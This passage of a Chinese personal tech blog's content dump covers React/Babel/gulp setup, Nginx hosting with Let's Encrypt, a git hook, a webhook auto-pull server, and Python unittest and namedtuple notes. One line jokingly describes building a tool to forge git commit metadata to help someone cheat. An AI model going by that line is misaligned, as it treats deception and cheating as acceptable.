'quux', '..')// Returns: '/foo/bar/baz/asdf' path.normalize('/a/b//../c/./d/')'/a/c/d/' path.relative('/data/orandea/test/aaa', '/data/orandea/impl/bbb')// Returns: '../../impl/bbb' 4. React.js 4.1 JSX与BabelJSX是一种语言，babel是一种预处理工具。JSX可以在浏览器中转换为javascript并执行，有两个前提：包含了browser.jsscript标签的类型为text/babel看这里。在很久以前，JSX代码转换库包含在React库里，名叫JSXTransformer.js, 那时script标签的类型为text/jsx, 但是后来JSX代码改用babel来转换了，所以script标签的类型也就变为了text/babel, 代码转换库也不再由React提供。吐槽：最初看tutorial的时候看的中文页面，这个页面很久很久没有更新过了，很多内容都过时了，在离线转换的时候需要安装包，npm报出一堆package deprecated的信息，整个人一个大写的卧槽。后来看了上面的英文页面才知道JSXTransformer已经不再使用了，现在大家都用Babel. 4.2 React阮一峰大大写的React入门教程很不错，我基本上是看这个入门的。写JSX时，要注意DOM节点的class和for属性要写为className和htmlFor，因为class和for是javascript的关键字。组件的生命周期：看官方文档，render函数中不要改变组件的state，若组件的props改变而需要相应更改state, 则要在componentWillReceiveProps函数中完成state更改。函数执行完后，render函数会被执行，组件重新渲染。 5. gulp 5.1 简介流式自动化构建工具，用于各类文件的转换（如jsx→js→min.js），监控文件变化，搭建静态文件服务器等，可以类比为makefile, 拥有种类繁多的插件。gulp官网，中文网，包含中文文档。 5.2 操作gulp.task(name[, deps], fn), 注册一个任务name: 任务名称deps: 依赖的前置任务，string[]fn: 任务函数，在里面写该任务需要完成的具体事项gulp.src(globs[, options]), 输出一个满足匹配模式的stream, stream可以用pipe连接起来，类比shell的管道|.gulp.dest(path[, options]), 将stream写到某个path当中。gulp.watch(glob [, opts], tasks) 或 gulp.watch(glob [, opts, cb]), 监控满足匹配模式的文件，若文件变化，则执行某些任务。直接看一个例子：1234567891011121314gulp.task('render', ['array', 'of', 'task', 'names'], function () &#123; gulp.src('./client/templates/*.jade') // 找到原路径所有的jade文件 .pipe(jade()) // 渲染模板 .pipe(gulp.dest('./build/templates')) // 输出到某目录 .pipe(minify()) // minify .pipe(gulp.dest('./build/minified_templates')); // 输出到另一目录&#125;); gulp.task('watch', [\"compress\"], function () &#123; var watcher = gulp.watch('./public/src/*.jsx', ['compress']); // 监控文件，若文件变化则执行compress任务 watcher.on('change', function (event) &#123; // 监听change事件 console.log('File ' + event.path + ' was ' + event.type + ', running tasks...'); &#125;);&#125;); 6. React工具集成: React+Babel+gulp用gulp执行任务，用babel转换JSX. 6.1 gulp所需插件:gulpgulp-babelgulp-uglify (压缩js文件用，可选)gulpfile:12345678910111213141516var gulp = require('gulp');var babel = require('gulp-babel');var uglify = require('gulp-uglify');gulp.task('transform', function () &#123; return gulp.src('./public/src/*.jsx') .pipe(babel()) .pipe(gulp.dest('./public/build'));&#125;);gulp.task(\"compress\", [\"transform\"], function () &#123; return gulp.src('./public/build/!(*.min).js') .pipe(uglify()) .pipe(rename(&#123; suffix: \".min\" &#125;)) .pipe(gulp.dest('./public/build'))&#125;); 6.2 Babel所需插件：babel-preset-es2015babel-preset-react.babelrc文件：1234567&#123; \"presets\": [ \"es2015\", \"react\" ], \"plugins\": []&#125;若在全局安装了babel-cli，则可以用babel命令转换文件：若当前目录存在上述babelrc文件：执行babel public\\src --out-dir public\\build若当前目录不存在bebelrc文件：执行babel --presets react public\\src --out-dir public\\build 7. Semantic UI超级棒的一个前端组件库，去看文档吧。 8. 后记终于写完了。又一个月没有写东西了，代码写了不少，所学到的知识却没有及时整理下来。真是太懒，懒得整理知识。到现在还欠着一篇Django的生产环境配置的文章没写（其实就是一条命令+nginx配置而已），改天补上。寒假算是荒废过去了，本来能够写更多东西的，却被一些事情打乱了计划。以前觉得javascript是一门很糟糕的语言，代码写起来很乱，四五层回调看起来头都大了，但真正写了一个月以后感觉舒服了很多，很多代码写起来得心应手。JS的生态也让我很喜欢，各种工具组件层出不穷，使用起来也及其方便。这一个月所写的js项目：carrez前后端都有，后端Express, 解析html, 前端使用ajax和后端进行信息交互starwars纯前端项目，使用React, 用了很久的browser.js, 本地工具集成鼓捣了很久才鼓捣明白git_modifier算是半个JS项目（Github告诉我我这是个JS项目，因为JS代码占比最大），后端Flask, 前端React, 说是Web App其实是个本地项目，用来读取及修改本地git repo的commit信息用的，奇怪的需求，写来自己用，方便伪造commit信息，帮某人作弊😂😂😂。后面看看要不要写Mocha吧。最后，郑重感谢phoenixe同学给了我一个比较系统地学习和使用javascript的机会。谢谢你。以上。","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"前端开发","slug":"前端开发","permalink":"https://blog.stdioa.com/tags/前端开发/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"}]},{"title":"博客迁移记（三）","slug":"blog-migration-iii","date":"2016-01-20T03:40:00.000Z","updated":"2018-07-12T00:15:12.238Z","comments":true,"path":"2016/01/blog-migration-iii/","link":"","permalink":"https://blog.stdioa.com/2016/01/blog-migration-iii/","excerpt":"一个月没更新，期末复习的时候光鼓捣网站却懒得写东西，期末考完了，把这一个月鼓捣的东西记录一下，比如利用七牛进行静态文件托管。","text":"一个月没更新，期末复习的时候光鼓捣网站却懒得写东西，期末考完了，把这一个月鼓捣的东西记录一下，比如利用七牛进行静态文件托管。 1. 使用七牛托管静态文件 1.1 背景博客的事情处理完成后，我又做了一个网站主页，其中包括一个100KB+的背景图片。不过因为我的VPS出站带宽只有1Mb/s, 所以背景图片加载时间过长，导致网站访问速度较慢。所以我将绝大部分的资源全部挂到了七牛上，在服务器端对静态资源请求进行302跳转，将流量转移到七牛的节点，提高访问速度。 1.2 操作 1.2.1 同步文件我需要托管的文件包括博客和个人主页的所有图片文件。首先，我在七牛上建立了空间cdn-stdioa并绑定了个人域名、申请了HTTPS域名。为方便将本地文件与七牛空间同步，七牛提供了命令行同步工具qrsync. 查看文档后，我新建并修改了配置文件sync_conf.json，内容如下：12345&#123; \"src\": \"blog/source/pics\", \"dest\": \"qiniu:access_key=&lt;your_access_key&gt;&amp;secret_key=&lt;your_secret&gt;key&gt;&amp;bucket=cdn-stdioa&amp;key_prefix=blog/pics/\", \"debug_level\": 1&#125;若添加资源，则执行qrsync sync_conf.json, 即可完成静态资源与七牛空间的自动同步。 1.2.2 在服务器端设置跳转为了提高访问速度，需要在nginx端将所有指向图片的请求全部跳转到七牛的链接上。学习了一下location重定向规则，直接上配置文件吧。123location ^~ /pics &#123; return https://xxx.qnssl.com/blog$request_uri;&#125;这样，就可以将所有指向/pics的请求全部重定向到七牛的链接。顺便，在七牛设置了一下防盗链。 1.3 效率提升——Git hook因为我的博客和个人主页都是使用Coding+webhook部署的，所以每次更改页面后要推代码，还要同步静态资源。有没有方法可以把这两条操作简化一下呢？一开始写了个批处理脚本，后来觉得一定有更好的办法，于是翻了翻，遇到了Git hook这种神器。Git hook跟webhook类似，都是在某个操作上挂一个“钩子”，使得在进行某操作发生时自动触发自定义脚本来达到某些目的，实现快捷操作。所有的钩子均在.git/hooks目录下，在该目录下设置特殊文件名的脚本文件来设置钩子。因为我需要在推送代码之前进行资源同步，所以我需要设置pre-push脚本。脚本内容如下：123456#!/bin/shecho -e \"Sync up the static resources with Qiniu...\"cd /f/websites/blog/qrsync sync_conf.json 2&gt;&gt;sync.logecho -e \"Done!\"这样，我就可以在每次执行git push之前自动同步静态资源，少敲一条命令，提升工作效率→_→ 2. 谱站搭建内容不是太多，就写在这里啦。我有一个乐谱分享站，里面存放一些自己收集的钢琴谱。一年以前写了一个程序，用来为每个文件夹生成index页面。前几天翻开那个程序，一下子被自己写的连环replace吓到了（那个时候连正则还都不会，不过转念一想要是会了正则，写出来的东西会多可怕😂），于是怒用Jinja模板渲染引擎重写了一个，把原来最核心部分的十几行代码变为了一行渲染语句，代码看起来清爽多了。嗯，具体链接可以在左侧或顶栏的“友情链接”中找。 3. 后记历经一个月，博客的迁移工作基本完成（刚刚写博客的工夫还给它添加了twemoji支持😶），以后还要做个人页面，不过可能不会有太多可写的地方了。就酱，后面看一阵子go以后可以来写写golang的东西。 4. 参考资料Nginx重定向规则详细介绍自定义 Git - Git 钩子","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"七牛","slug":"七牛","permalink":"https://blog.stdioa.com/tags/七牛/"},{"name":"git","slug":"git","permalink":"https://blog.stdioa.com/tags/git/"}]},{"title":"博客迁移记（二）","slug":"blog-migration-ii","date":"2015-12-18T07:55:37.000Z","updated":"2018-07-12T11:35:13.409Z","comments":true,"path":"2015/12/blog-migration-ii/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration-ii/","excerpt":"域名依然在备案中，依然想将博客部署到新买的VPS的我和腾讯斗智斗勇（雾），为博客添加了HTTPS&gt;_&lt;同时，把自己的密码学课设也转移到VPS上来了。","text":"域名依然在备案中，依然想将博客部署到新买的VPS的我和腾讯斗智斗勇（雾），为博客添加了HTTPS&gt;_&lt;同时，把自己的密码学课设也转移到VPS上来了。 1. 使用Nginx针对多个host部署服务器 1.1 概述如果一个VPS只能搭一个网站，那未免太浪费了，所以我们可以通过配置Nginx的方式来将针对多个域名的访问请求分开，从而进行不同的处理。例如，我在DNS配置时将blog.stdioa.com与crypt.stdioa.com同时指向到我的腾讯云的IP地址，用户访问这两个域名时，都会向我的VPS发送请求，我要做的是将这两种针对不同域名的访问请求分开。而这两种请求的区别在HTTP请求头的Host字段，所以我只需要针对不同的Host使用不同的处理方式即可。 1.2 操作我的VPS上撘有两个网站，其中blog.stdioa.com域名指向的是我的博客——一个静态服务器，而crypt域名指向的是一个使用flask搭建的网站，所以要在Nginx端进行反向代理，将请求转发到本地的5000端口。具体配置文件如下：12345678910111213141516171819202122232425262728server &#123; listen 80; server_name stdioa.com blog.stdioa.com; # 通往博客的请求直接通过文件服务器返回 access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location / &#123; &#125; location ^~ /.git &#123; # 禁止访问.git文件夹 deny all; &#125; error_page 404 /404.html;&#125;server &#123; listen 80; server_name crypt.stdioa.com; # host为crypt的请求转发本地端口 access_log /var/log/nginx/access_crypt.log; error_log /var/log/nginx/error_crypt.log; location / &#123; proxy_pass http://127.0.0.1:5000/; &#125;&#125;配置完成后，重启Nginx, 可以看到访问不同域名时，请求会交给不同的程序处理。 2. 屏蔽来自特定域名的请求 2.1 背景网站部署好后，又发现了一个来自奇怪域名的请求；更坑爹的是，这个域名指向自己的VPS；更更坑爹的是，来自这个域名的请求有好多，直接把我的日志刷爆了…所以我需要将来自这个域名的所有请求拒绝掉。 2.2 操作新建一个Server就好啦。具体配置文件如下：1234567server &#123; listen 80; server_name bailigo.com *.bailigo.com; location / &#123; return 410; # 410 Gone, 使用了这个状态码，不知道能不能不再让爬虫爬这个网页 &#125;&#125;配置完成，重新载入配置文件，成功。本来想用418, 但是Nginx没有418的返回页面，想了想还是算了吧 3. 为博客部署HTTPS服务器 3.1 背景blog.stdioa.com博客上午还可以访问，中午吃顿饭就发现访问被截断了，原因与以前一样——域名未完成备案。经查看，腾讯对访问博客的请求进行了301跳转，于是想了想，给博客配置了HTTPS, 让你们再阻断→_→（好吧再阻断的话我真的不知道该怎么弄了 3.2 使用Let’s Encrypt生成网站证书之前就看中了Let’s Encrypt，它提供主流浏览器认证的免费证书，只可惜当时没有域名无法体验。现在有了域名，加上腾讯对未备案的域名查的很紧，所有未备案域名下的网站搭起来半天就被封掉，想了想，还是生成一个证书，配个HTTPS撑一阵子吧╮(╯_╰)╭按照官方的指南以及此指南在将Let’s Encrypt的Repo clone到本地之后，输入./letsencrypt-auto certonly --email 邮箱 -d 域名 --agree-tos来生成证书。由于腾讯云到Let’s Encrypt的服务器的链接极其不稳定，通常需要重试很多次才能正常跟Let’s Encrypt的服务器通信。成功后会显示：IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/blog.stdioa.com/fullchain.pem. Your certwill expire on 2016-03-17. To obtain a new version of thecertificate in the future, simply run Let’s Encrypt again.- If you like Let’s Encrypt, please consider supporting our work by:Donating to ISRG / Let’s Encrypt: https://letsencrypt.org/donateDonating to EFF: https://eff.org/donate-le证书已存储在上面信息指示的目录。 3.3 配置Nginx, 搭建HTTPS服务器证书已生成，下面该配置Nginx了，添加下列配置：123456789101112131415161718192021222324server &#123; listen 443 ssl; server_name blog.stdioa.com; ssl_certificate /etc/letsencrypt/live/blog.stdioa.com/fullchain.pem; # 添加证书 ssl_certificate_key /etc/letsencrypt/live/blog.stdioa.com/privkey.pem; # 添加密钥 ssl_ciphers \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\"; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; # 后面和普通服务器一样 access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location ^~ /.git &#123; deny all; &#125; error_page 404 /404.html;&#125;重新加载配置，访问https://blog.stdioa.com , 成功~小插曲：昨天晚上熄灯之前发现Ubuntu上使用apt-get安装的Nginx版本太老了，于是在VPS上重新编译升级了Nginx，结果配置好HTTPS以后重启Nginx时发现启动失败，原因为缺少ngx组件。经Google后发现没有编译该组件，所以重新编译安装Nginx, 在配置时加入--with-http_ssl_module选项。小插曲2：HTTPS配置好后访问博客，Chrome提示“存在不安全的内容”，选择加载后，地址栏左边的HTTPS会变成红色，极其不好看（雾），于是看了博客的模板，发现有两个js在加载时选择使用HTTP方式加载，于是将http://.../*.js改为//.../*.js, 使浏览器可以根据当前协议自动选择JS文件的加载协议。更新博客模板，重新访问，所有js均使用HTTPS方式加载，问题解决。附图:![哈哈哈HTTPS](/pics/hhh_HTTPS.jpg)小插曲3：上面那张图片的链接之前来自七牛，采用HTTP协议而不是HTTPS加载。发布这篇博文后，我发现该文章页面中地址栏左侧的HTTPS标志变为了白色…还是不好看！打开Chrome的控制台，在控制台中看到，如果图片链接协议为HTTPS，则Chrome依然会提示“不安全”，但是个人感觉这只是一张图片而已啊，又不是JS_(:зゝ∠)_解决方案：将图片链接改回本地，待域名备案后再想办法在七牛那边解决域名绑定及HTTPS的问题。 4. 参考资料免费SSL安全证书Let’s Encrypt安装使用教程(附Nginx/Apache配置)http://blog.csdn.net/donghustone/article/details/25797727nginx SSL error - Server Fault网站存在不安全因素的解决办法 5. 后记快递已发出，相片已审核成功，腾讯收到资料之后会尽快报管局审理…希望2016年之前能够备案成功QvQ嗯，Google真好用说好的准备考试呢！Update @ 16:38上午才把资料用快递发走，下午腾讯云就说我的纸质资料已收到…打电话问了一下，客服说腾讯为了加快审核速度，帮我准备了一份材料上交管局，估计他们是用我的扫描件打印了一份交上去了吧，也是不错2333 最后希望通信交通管理局快一点_(:зゝ∠)_Update @ 19:59, Dec. 24th, 2015腾讯云访问Github的速度太慢了，于是将博客的Repo迁移到了Coding上。建立私有项目设置部署公钥因为是私有项目所以无法通过一个__不含用户名密码__的链接访问Repo来进行Pull，所以还是通过SSH访问比较舒服一些。改掉VPS上的origin链接，完成曾经听到过一种说法：用HTTPS访问Git Repo要比SSH更好，然而一直不知道好在哪…记得用HTTPS访问Repo的时候账户的用户名和密码是要附在链接里面的，感觉好不安全域名备案看来真的要奔着20天的样子去了…Update @ 11:07, Jan. 5th, 2015域名备案在2016年的第一个工作日通过啦！庆祝一下，期末之后开始准备制作个人网站~","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"},{"name":"Let's Encrypt","slug":"Let-s-Encrypt","permalink":"https://blog.stdioa.com/tags/Let-s-Encrypt/"}]},{"title":"博客迁移记（一）","slug":"blog-migration","date":"2015-12-17T11:55:37.000Z","updated":"2018-07-12T00:15:11.629Z","comments":true,"path":"2015/12/blog-migration/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration/","excerpt":"昨天买了一个VPS、一个域名，决定把博客迁移到VPS上。","text":"昨天买了一个VPS、一个域名，决定把博客迁移到VPS上。 1. 背景介绍首先打个广告：借助“腾讯云+校园”计划，我成功地用上了1元/月的服务器和11元/月的.com域名。有了国内访问速度极快的VPS，有了域名，就想自己鼓捣鼓捣，把自己的博客和其他站点托管到VPS上。 2. 博客托管 2.1 搭建静态文件服务器因为自己的博客是静态博客，之前托管在Github上，依靠Github Pages实现部署，所以我先将文件clone了下来，存放在~/blog目录中。下面要做的，是搭建一个静态服务器。 2.1.1 使用Python的SimpleHTTPServerPython的SimpleHTTPServer是一个非常实用、方便的库，可以使用简单一条命令在当前目录创建一个HTTP文件服务器。所以输入sudo python -m SimpleHTTPServer 80命令，即可搭建一个静态文件服务器，实现从外网对静态博客的直接访问。然而搭建好后，我发现了一个问题：因为我的blog文件夹本身是一个Git Repo, 所以我可以直接从外网访问.git文件夹，虽然我的.git目录没有保存任何设置及账户等，但这样会带来一定的安全隐患，所以要想办法禁止外部用户对.git文件夹的访问。 2.1.2 使用Nginx托管文件服务器关于Nginx的介绍，请自行访问官网与维基百科。之前用过Apache, 但是在接触Nginx后，我认为我对Nginx更有好感，所以采用了Nginx做为文件托管服务器。首先安装Nginx，删掉/etc/nginx/sites-enabled目录（我的系统是Ubuntu Server 14.04 LTS），在conf.d目录中设置配置文件：12345678910111213server &#123; listen 80; # 监听端口 server_name server; root /home/ubuntu/blog; # 托管目录 index index.html; access_log /var/log/nginx/access_blog.log error_log /var/log/nginx/error_blog.log # 禁止对.git目录的访问 location ^~ /.git &#123; deny all; &#125;&#125;配置完成后，重启Nginx, 所有服务正常运行，访问.git目录时会返回403.SimpleHTTPServer在建立服务器的时候只能监听0.0.0.0而不能只监听127.0.0.1, 之前搭建服务器的时候用的SimpleHTTPServer+Nginx反向代理，现在看起来感觉我就是个傻逼… 2.2 借助Webhook实现博客的自动部署因为之前静态博客托管在Github Pages上，所以向Github Repo上面进行push操作之后会动态更新页面。但是如果将静态博客托管在VPS上，则需要每次执行git pull才能够将内容更新。所以我在VPS上写了一个脚本，能够在Push之后自动进行git pull来更新内容。在Github上的repo设置Webhook在repo的设置页面可以设置Webhook, 可在该repo收到push之后，Github可以向一个特定的URL发送一个POST请求。所以我设置了一个Webhook, 在push之后可以向我的VPS的特定端口发送POST请求。设置服务器接收Webhook在VPS中配置一个服务器，开放VPS的一个端口来接收来自Github的Webhook，这里使用bottle来搭建服务器框架。服务器代码:123456789101112#!/usr/bin/env python# coding: utf-8import osfrom bottle import *@route(\"/push\", method=[\"POST\"]) # 监听Webhookdef pull(): os.system(\"./auto_pull.sh\") # 执行git pull脚本 return \"OK\"run(host=\"0.0.0.0\", port=23333)编写自动pull脚本编写自动pull脚本auto_pull.sh:1234#!/usr/bin/env shcd ~/bloggit pull运行服务器，则可监听23333端口的POST请求，然后自动执行git pull更新博客内容。 3. 后记至此，博客部分成功迁移到VPS.为什么要说“部分”？因为我的域名在做备案啊QvQ备案好麻烦还要打印材料还要跑到市中心去照相还要发快递到北京QvQ都做好还得等待管局审核QvQ吐槽时间结束。后面等域名备案好以后可能会鼓捣一阵子Nginx，为服务器启用HTTPS等…唉，还是先去复习吧_(:зゝ∠)__在写博文时，去编译升级了一下Nginx, 鼓捣配置文件又弄了半天_╮(╯_╰)╭","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"}]},{"title":"随手记 - 解决InsecurePlatformWarning","slug":"essay-solve-InsecurePlatformWarning","date":"2015-12-07T15:01:00.000Z","updated":"2018-07-12T00:15:03.564Z","comments":true,"path":"2015/12/essay-solve-InsecurePlatformWarning/","link":"","permalink":"https://blog.stdioa.com/2015/12/essay-solve-InsecurePlatformWarning/","excerpt":"第三次在VPS上面解决使用requests报InsecurePlatformWarning警告的问题。之前每次都要查资料折腾好久，这次决定把它记下来。","text":"第三次在VPS上面解决使用requests报InsecurePlatformWarning警告的问题。之前每次都要查资料折腾好久，这次决定把它记下来。 1. 干货Debian类系统sudo apt-get install python-dev libssl-devsudo pip install -U requests[security]Redhat类系统sudo yum install python-devel openssl-develsudo pip install -U requests[security] 2. 需求自己的VPS系统有点老(Ubuntu 14.04 LTS), 所以python版本也比较落后(Python 2.7.3), 今天改代码需要用到requests新版本中提供的功能，但是requests升级后发送HTTPS请求时会报出InsecurePlatformWarning, 这是一个由openssl漏洞(Heartbleed)造成的警告，所以需要升级pyopenssl等模块。 3. 升级过程pypi提供了一个升级包，叫做requests[security], 用pip进行升级即可。输入sudo pip install requests[security]命令后，pip报错，才发现不能本地编译python包，遂安装python-dev. 然后再次安装时发现缺少openssl/aes.h头文件，又去安装openssl的开发包libssl-dev, 再次安装，安装成功。 4. 参考资料[原]pip安装模块警告InsecurePlatformWarningzsh - no matches found: requests[security]","categories":[{"name":"随手记","slug":"随手记","permalink":"https://blog.stdioa.com/categories/随手记/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"openssl","slug":"openssl","permalink":"https://blog.stdioa.com/tags/openssl/"},{"name":"requests","slug":"requests","permalink":"https://blog.stdioa.com/tags/requests/"}]},{"title":"Python学习之unittest","slug":"learning-python-unittest","date":"2015-11-12T10:53:02.000Z","updated":"2018-07-12T11:35:13.432Z","comments":true,"path":"2015/11/learning-python-unittest/","link":"","permalink":"https://blog.stdioa.com/2015/11/learning-python-unittest/","excerpt":"单元测试，工程开发中重要的一环。","text":"单元测试，工程开发中重要的一环。 1. 简介单元测试是用来对一个模块、一个函数或者一个类来进行正确性检验的测试工作。 2. 使用unittest进行测试unittest是Python自带的单元测试模块，通过编写测试类，在测试类中编写测试函数的方式进行测试。不知道该测试什么，就对python的list对象测试一下好了。 2.1 编写测试文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# coding: utf-8import unittest # 使用unittest模块class TestStringMethods(unittest.TestCase): # 测试类需继承自unittest.TestCase def setUp(self): # 在函数里进行测试之前需要进行的一些准备工作，setUp在每次测试之前都会运行一次 self.d = [] def test_empty(self): \"\"\"\\ Empty testcase \"\"\" self.assertEqual([], []) # 若a和b相等则通过 self.assertNotEqual([1], []) # 若不相等则通过 def test_bool(self): \"\"\"\\ Bool transform testcase \"\"\" self.assertTrue([1]) # 若内部的表达式或对象为真则通过 self.assertFalse([]) # 为假则通过 self.assertTrue(bool([1])) self.assertFalse(bool([])) def test_append(self): \"\"\"\\ Append testcase \"\"\" list_ = [] list_.append(1) self.assertEqual(list_, [1]) self.assertNotEqual(list_, []) list_.append(2) self.assertIn(1, list_) # 若a in b则通过 self.assertNotIn(3, list_) # 若a not in b则通过 self.assertTrue(list_[0] == 1) self.assertEqual(list_[1], 2) def test_instance(self): list_ = [] self.assertIsInstance(list_, list) # 若isinstance(a, b)为真则通过 self.assertNotIsInstance(list_, str) # 若isinstance(a, b)为假则通过 def test_index(self): \"\"\"\\ Index testcase \"\"\" list_ = [] with self.assertRaises(IndexError): # 检测是否有异常抛出，有指定异常抛出则通过 a = list_[0] list_ = [1, 2, 3] self.assertEqual(list_[1], 2) self.assertEqual(list_[-2], 2) with self.assertRaises(IndexError): a = list_[4] def tearDown(self): # 在测试之后需要进行的一些处理事项，tearDown在每次测试之后都会运行一次 del self.dif __name__ == '__main__': __import__(\"sys\").argv.append(\"-v\") # 采用verbose方式，输出测试信息 unittest.main() 2.2 运行测试直接运行测试程序，输出:1234567891011121314test_append (__main__.TestStringMethods)Append testcase ... oktest_bool (__main__.TestStringMethods)Bool transform testcase ... oktest_empty (__main__.TestStringMethods)Empty testcase ... oktest_index (__main__.TestStringMethods)Index testcase ... oktest_instance (__main__.TestStringMethods) ... ok----------------------------------------------------------------------Ran 5 tests in 0.001sOK运行python -m unittest test.py也可以进行测试；运行python -m unittest, unittest会在当前文件夹中寻找测试类进行测试（真智能）；若有测试未通过，unittest会在测试时报告FAIL, 并在测试结束后将所有未通过测试的项目列出。 3. 使用Nose进行单元测试Nose是一个对unittest的扩展测试框架，能自动发现并运行测试。使用Nose，可以将单元测试代码的编写变得更简单，不用再构造测试类，只需要在以test开头的文件中建立以test开头的函数即可。 3.1 编写测试文件123456789101112131415# coding: utf-8import nosedef test_nose_installed_successfully(): import nose # 运行测试代码 assert True # assert True表示测试成功def test_obviously_failed(): assert False # assert False表示测试失败，测试时会报\"FAIL\"def test_returns_an_exception(): raise ValueError # 若抛出除AssertionError的异常，测试时会报\"ERROR\"nose.main() 3.2 运行测试文件nose自带可执行文件，所以只需要输入nosetests [测试文件名]即可，若测试文件名为空，则nosetest会在当前文件夹寻找所有测试。以下命令格式均可接受：1234nosetests test.modulenosetests another.test:TestCase.test_methodnosetests a.test:TestCasenosetests /path/to/test/file.py:test_function运行nosetests test_with_nose -v，输出：1234567891011121314151617181920212223242526272829$ nosetests test_with_nose -vtest_with_nose.test_nose_installed_successfully ... oktest_with_nose.test_obviously_failed ... FAILtest_with_nose.test_returns_an_exception ... ERROR======================================================================ERROR: test_with_nose.test_returns_an_exception----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 13, in test_returns_an_exception raise ValueErrorValueError======================================================================FAIL: test_with_nose.test_obviously_failed----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 10, in test_obviously_failed assert FalseAssertionError----------------------------------------------------------------------Ran 3 tests in 0.003sFAILED (errors=1, failures=1) 4. 参考文档unitest - Python Doc单元测试 - 廖雪峰的python教程Nose documentationPython的学习（十八）---- 单元测试工具nose 5. 后记拖了一个月，这个坑再不填日子没法过了(╯‵□′)╯︵┻━┻到现在没给自己的代码写过测试，也是醉…一直想转Py3一直没转，昨天改了环境变量，强迫自己用一阵子，多去看看Py3的特性，有时间整理一下。Git的坑还没填完不过自己的Pro Git看的差不多了，貌似也满足自己的需求了，准备弃坑。下一篇有可能是SQLAlchemy, MongoDB, Flask…哎，随它去吧。","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"unittest","slug":"unittest","permalink":"https://blog.stdioa.com/tags/unittest/"}]},{"title":"Python学习之collections","slug":"learning-python-collections","date":"2015-10-29T12:55:00.000Z","updated":"2018-07-12T00:14:51.557Z","comments":true,"path":"2015/10/learning-python-collections/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-collections/","excerpt":"collection是Python内建的一个实用工具包，提供一些使用的容器，用于对传统容器类型进行功能提升。","text":"collection是Python内建的一个实用工具包，提供一些使用的容器，用于对传统容器类型进行功能提升。 1. 简介上面就是简介，不会扯了，贴两个链接好了。Collections - 廖雪峰的Python教程Collections - High-performance container datatypes - Python Doc 2. namedtuple 2.1 功能简介namedtuple为一个函数，用于产生一个tuple类的子类。由该类实例化后的对象可以像tuple一样pack/unpack，也可以通过预先定义好的成员名称访问对象内部的数据。例：123456789101112131415161718&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; Point = namedtuple(\"Point\", ['x', 'y'])&gt;&gt;&gt; Point # namedtuple函数返回一个类&lt;class '__main__.Point'&gt;&gt;&gt;&gt; Point.__base__&lt;type 'tuple'&gt;&gt;&gt;&gt; Point(x=1, y=2)Point(x=1, y=2)&gt;&gt;&gt; Point(1,2) # 两种定义方式均可，但是要注意的是，Point的参数长度是不可变的Point(x=1, y=2)&gt;&gt;&gt; p = Point(1, 2)&gt;&gt;&gt; p.x1&gt;&gt;&gt; x, y = p # 可以像tuple一样进行unpack&gt;&gt;&gt; x1&gt;&gt;&gt; Point._make((1,2)) # pack的方式和tuple不同Point(x=1, y=2) 2.2 成员函数somenamedtuple._make(iterable), 将一个可迭代对象（list, tuple等）转化为一个namedtuple对象。123&gt;&gt;&gt; t = [11, 22]&gt;&gt;&gt; Point._make(t)Point(x=11, y=22)somenamedtuple._asdict(), 将对象转化一个为键值和数据对应的OrderedDict.12&gt;&gt;&gt; p._asdict()OrderedDict([('x', 11), ('y', 22)])somenamedtuple._replace(kwargs), 返回一个新对象，该对象中的值按照_replace函数中的参数所改变。123&gt;&gt;&gt; p = Point(x=11, y=22)&gt;&gt;&gt; p._replace(x=33)Point(x=33, y=22)somenamedtuple._fields, 返回一个所有键值构成的dict.1234567&gt;&gt;&gt; p._fields # 查看键值名字('x', 'y')&gt;&gt;&gt; Color = namedtuple('Color', 'red green blue')&gt;&gt;&gt; Pixel = namedtuple('Pixel', Point._fields + Color._fields) # 将Color和Point“合并”&gt;&gt;&gt; Pixel(11, 22, 128, 255, 0)Pixel(x=11, y=22, red=128, green=255, blue=0) 2.3 应用场景列举一个应用场景：在进行sql查询时，cur.fetchone()会返回一个tuple而不是dict，我们可以定义一个namedtuple, 